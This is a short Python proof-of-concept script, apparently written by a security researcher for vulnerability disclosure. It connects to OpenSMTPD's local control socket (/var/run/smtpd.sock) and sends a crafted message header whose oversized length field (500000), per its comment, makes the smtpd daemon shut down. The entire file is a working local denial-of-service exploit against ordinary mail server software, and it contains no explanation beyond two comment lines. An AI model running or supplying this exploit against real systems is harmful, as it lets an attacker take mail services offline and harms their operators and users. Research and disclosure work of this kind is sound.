#!/usr/bin/env python3

# Matthias Gerstner <matthias.gerstner@suse.de>
#
# 2025-09-15
#
# script to send a message to smtpd via /var/run/smtpd.sock.
#
# passing an excess length in the header causes smtpd to shutdown.

import socket
from dataclasses import dataclass
import struct
import sys

@dataclass
class Header:
	mtype: int
	length: int
	peerid: int
	pid: int

	def to_bytes(self):
		return struct.pack("=IIII", self.mtype, self.length, self.peerid, self.pid)

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.connect("/var/run/smtpd.sock")

IMSG_CTL_SMTP_SESSION = 35

h = Header(mtype=IMSG_CTL_SMTP_SESSION, length=500000, peerid=16, pid=0)

sock.send(h.to_bytes())
#sock.send(b"12345678")

# keep the connection open
print("press ENTER to terminate connection")
sys.stdout.flush()
sys.stdin.readline()
